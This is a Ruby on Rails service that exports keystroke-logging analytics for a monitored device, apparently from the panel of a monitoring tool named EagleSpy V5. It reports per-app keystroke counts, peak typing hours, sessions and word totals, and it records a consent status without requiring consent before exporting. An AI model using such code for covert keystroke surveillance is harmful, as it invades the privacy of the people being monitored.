# frozen_string_literal: true

require 'csv'

class KeylogExportService < ApplicationService
  attr_reader :device, :analytics, :format, :consent

  def initialize(device, format: :json, start_date: 30.days.ago, end_date: Time.current)
    @device = device
    @format = format.to_sym
    @analytics = KeylogAnalyticsService.new(device, start_date: start_date, end_date: end_date).call
    @consent = device_consent
  end

  def call
    case format
    when :csv then export_csv
    when :json then export_json
    else
      raise ArgumentError, "Unsupported export format: #{format}"
    end
  end

  private

  def export_csv
    CSV.generate(headers: true) do |csv|
      csv << ['EagleSpy V5 - Keylog Analytics Report']
      csv << ["Device: #{device.name} (#{device.device_id})"]
      csv << ["Generated: #{Time.current.iso8601}"]
      csv << ["Consent Verified: #{consent[:verified_at]}"]
      csv << ["Consent Status: #{consent[:status]}"]
      csv << []

      # Summary
      csv << ['--- Summary ---']
      csv << %w[Metric Value]
      summary = analytics[:summary]
      csv << ['Total Keystrokes', summary[:total_keystrokes]]
      csv << ['Unique Apps', summary[:unique_apps]]
      csv << ['Active Days', summary[:active_days]]
      csv << ['Avg Keystrokes/Day', summary[:avg_keystrokes_per_day]]
      csv << ['Date Range Start', summary[:date_range][:start]]
      csv << ['Date Range End', summary[:date_range][:end]]
      csv << []

      # App Usage
      csv << ['--- App Usage Distribution ---']
      csv << %w[App Keystrokes Percentage]
      analytics[:app_usage].each do |app|
        csv << [app[:app_package], app[:keystroke_count], "#{app[:percentage]}%"]
      end
      csv << []

      # Peak Hours
      csv << ['--- Peak Activity Hours ---']
      csv << %w[Hour Keystrokes]
      analytics[:peak_hours].each do |ph|
        csv << ["#{ph[:hour]}:00", ph[:count]]
      end
      csv << []

      # Sessions
      csv << ['--- Session Summary ---']
      sessions = analytics[:sessions]
      csv << ['Total Sessions', sessions[:total_sessions]]
      csv << ['Avg Session (min)', sessions[:avg_session_minutes]]
      csv << ['Longest Session (min)', sessions[:longest_session_minutes]]
      csv << []

      # Word Count
      csv << ['--- Word Count ---']
      wc = analytics[:word_count]
      csv << ['Total Characters', wc[:total_characters]]
      csv << ['Estimated Words', wc[:estimated_words]]
      csv << ['Text Events', wc[:text_events]]
    end
  end

  def export_json
    {
      report: {
        title: 'EagleSpy V5 - Keylog Analytics Report',
        device: { name: device.name, device_id: device.device_id },
        generated_at: Time.current.iso8601,
        consent: consent
      },
      analytics: analytics
    }.to_json
  end

  def device_consent
    consent_record = DeviceConsent.find_by(device_id: device.id, consent_type: 'data_collection')
    if consent_record&.active?
      { status: 'granted', verified_at: consent_record.granted_at&.iso8601, version: consent_record.consent_version }
    else
      { status: 'not_verified', verified_at: nil, version: nil }
    end
  rescue => e
    Rails.logger.error("Consent lookup failed: #{e.message}")
    { status: 'unknown', verified_at: nil, version: nil }
  end
end
